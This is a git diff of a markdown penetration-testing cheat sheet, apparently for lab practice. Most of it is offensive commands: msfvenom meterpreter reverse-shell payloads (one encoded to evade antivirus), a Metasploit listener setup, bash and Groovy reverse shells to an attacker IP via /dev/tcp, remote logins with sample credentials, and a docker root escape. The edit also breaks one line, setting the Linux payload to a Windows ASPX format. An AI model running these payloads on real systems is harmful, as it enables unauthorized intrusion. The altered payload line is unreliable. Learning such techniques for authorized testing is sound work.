@@ -16,6 +16,7 @@ After adding you text or editing the file, press "ctrl+s" to save the file.
 Step 3.
 Press "ctrl+x" to exit.
 ```
+---
 
 # Section 2. Rconnaissance
 
@@ -142,8 +143,10 @@ gobuster [mode] -u [target ip] -w [wordlist]
 
 Example:
 gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
-
 ```
+
+---
+
 # Section 3. Weaponization
  - NetExec SMB/RDP Password Attacks
 ```
@@ -212,13 +215,13 @@ exploit
 # Syntax: msfvenom –p <payload> <options> -f <format> -o <output_file>
 
 # Example Windows Payload:
-msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f exe –o shell.exe
+msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f aspx –o shell.aspx
 
 # Example Linux Payload:
-msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f elf –o shell.elf
+msfvenom –p linux/x86/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –f aspx –o shell.aspx
 
 # Example Encoded Payload (AV bypass):
-msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –e x86/shikata_ga_nai –f exe –o encoded_shell.exe
+msfvenom –p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 –e x86/shikata_ga_nai –f aspx –o encoded_shell.aspx
 ```
  - Bloodhound
 ```
@@ -241,6 +244,9 @@ localhost:8080
 
 4. Upload the JSON files
 ```
+
+---
+
 # Section 4. Delivery
  - Delivering Files via SSH/SCP
 ```
@@ -289,6 +295,119 @@ sudo cp /opt/winpeas/winPEASany.exe /mnt
 ```
 1. Identify a file upload form on the target website.
 2. Upload a malicious file (e.g., .php, .jpg with embedded code).
+```
+
+# Section 5. Initial Access
+
+## Windows Access
+
+ - **xfreerdp3**
+```bash
+# Syntax: xfreerdp3 /v:target_ip /u:username /p:password /d:domain-name /dynamic-resolution /drive:shared,/path/to/local/files
+# /drive: Shares a local directory with the target.
+# Connect to the target via RDP.
+# Access the shared drive from the target machine (e.g., \\tsclient\shared).
+# Copy files from the shared drive to the target.
+
+# Example:
+xfreerdp3 /v:10.5.10.30 /u:mark /p:987654321 /d:practice.local /dynamic-resolution /drive:shared,/home/kali/
+```
+
+ - **evil-winrm**
+```bash
+# Syntax:
+evil-winrm -i TARGET_IP -u USERNAME -p PASSWORD
+
+# Example:
+evil-winrm -i 192.168.1.222 -u john -p my-pass
+```
+
+ - **Reverse Shells**
+```bash
+# What is a reverse shell?
+# A reverse shell is when a target machine connects back to YOUR machine,
+# giving you remote access to control it.
+
+Steps:
+
+1. Make sure you have a way to send your file (payload) to the target machine
+   and run it there.
+   Example: a file upload feature, shared folder, or command execution.
+
+2. Create your payload using msfvenom.
+   (You can search "msfvenom" in this document for more details)
+
+   Example:
+   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.0.1 LPORT=4444 -f aspx -o shell.aspx
+
+   Explanation:
+   - LHOST = your IP address (where the target will connect back)
+   - LPORT = port on your machine to listen on
+   - shell.aspx = the file that will run on the target
+
+3. Start Metasploit and set up a listener (this waits for the connection):
+
+   msfconsole
+   use exploit/multi/handler
+   set PAYLOAD windows/x64/meterpreter/reverse_tcp   # must match msfvenom
+   set LHOST 10.100.0.1                              # same IP as above
+   set LPORT 4444                                    # same port as above
+   run
+
+4. Send (deliver) the payload file to the target machine.
+
+5. Execute the payload on the target.
+
+6. If everything works, the target machine will connect back to you,
+   and you will get a remote shell (control of the system).
+```
+## Linux Access
+
+ - **SSH**
+```bash
+# SSH lets you remotely log into a Linux machine
+
+# 1. If you have an SSH key
+# Syntax:
+ssh -i id_rsa user@target
+
+# Example:
+ssh -i id_rsa john@192.168.2.20
+
+# 2. If you have a password
+# Syntax:
+ssh user@target
+
+# Example:
+ssh john@192.168.2.20
+```
+
+ - **Reverse Shells**
+```bash
+# What is a reverse shell?
+# A reverse shell makes the target machine connect back to YOUR machine,
+# giving you remote command access.
+
+Steps:
+
+1. Make sure you can run commands on the target machine
+   (for example: command injection, web shell, etc.)
+
+2. Start a listener on YOUR machine (this waits for the connection):
+   nc -lvnp 9001
+
+3. Run a reverse shell command on the target machine
+
+   You can find many ready-to-use commands here:
+   https://www.revshells.com/
+
+Examples of common reverse shell commands:
+
+# Bash reverse shell
+bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1
+
+# Groovy reverse shell
+["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1"].execute()
 ```
 
 # Section 5. Privilege Escalation
@@ -354,7 +473,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
 /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt    # Wordlist for discovering hidden directories/files
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      # Wordlist for discovering hidden directories/files
 ```
-Peass
+### Peass
 ```
 /usr/share/peass
 ```
